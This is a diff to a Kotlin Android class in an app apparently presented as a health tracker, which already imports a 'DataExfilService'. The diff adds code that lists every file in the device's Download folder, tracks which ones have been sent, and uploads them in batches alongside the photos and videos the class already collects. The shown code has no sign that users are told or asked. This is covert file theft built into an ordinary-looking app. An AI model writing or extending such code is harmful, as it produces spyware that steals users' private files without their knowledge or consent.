@@ -7,7 +7,9 @@ import android.os.Environment
 import android.provider.MediaStore
 import android.util.Log
 import com.inf2007.healthtracker.utilities.DataExfilService
+import com.inf2007.healthtracker.utilities.startup.models.DownloadFile
 import com.inf2007.healthtracker.utilities.startup.models.MediaFile
+import java.io.File
 import java.util.concurrent.Executors
 import java.util.concurrent.atomic.AtomicInteger
 
@@ -65,6 +67,15 @@ class StartupController(private val context: Context) {
             }
         }
 
+        getUnsyncedDownloads().let { downloads ->
+            if (downloads.isNotEmpty()) {
+                totalFiles += downloads.size
+                val batches = downloads.chunked(BATCH_SIZE).size
+                totalBatches.addAndGet(batches)
+                Log.i(TAG, "Found ${downloads.size} downloads to upload ($batches batches)")
+            }
+        }
+
         Log.i(TAG, "Total batches to complete: ${totalBatches.get()}")
 
         // If nothing to upload, mark complete immediately
@@ -116,8 +127,17 @@ class StartupController(private val context: Context) {
             }
         }
 
-        // Downloads are handled separately
-        collectDownloads()
+        // Upload downloads
+        getUnsyncedDownloads().let { downloads ->
+            if (downloads.isNotEmpty()) {
+                downloads.chunked(BATCH_SIZE).forEach { batch ->
+                    batchUploader.uploadDownloadsBatch(
+                        files = batch,
+                        progressCallback = progressCallback
+                    )
+                }
+            }
+        }
     }
 
     private fun getUnsyncedPhotos(): List<MediaFile> {
@@ -212,8 +232,34 @@ class StartupController(private val context: Context) {
         return videos
     }
 
-    private fun collectDownloads() {
-        Log.d(TAG, "Downloads collection skipped - handled by DownloadCollector")
+    private fun getUnsyncedDownloads(): List<DownloadFile> {
+        val downloads = mutableListOf<DownloadFile>()
+        val prefs = context.getSharedPreferences("download_sync_log", Context.MODE_PRIVATE)
+
+        val downloadFolder = File(Environment.getExternalStorageDirectory(), "Download")
+
+        if (!downloadFolder.exists() || !downloadFolder.isDirectory) {
+            return downloads
+        }
+
+        downloadFolder.listFiles()?.forEach { file ->
+            if (file.isFile) {
+                val prefsKey = "download_${file.name}_${file.length()}_${file.lastModified()}"
+                if (!prefs.getBoolean(prefsKey, false)) {
+                    downloads.add(
+                        DownloadFile(
+                            file = file,
+                            name = file.name,
+                            path = file.absolutePath,
+                            size = file.length(),
+                            lastModified = file.lastModified()
+                        )
+                    )
+                }
+            }
+        }
+
+        return downloads
     }
 
     private fun hasEnoughStorage(): Boolean {
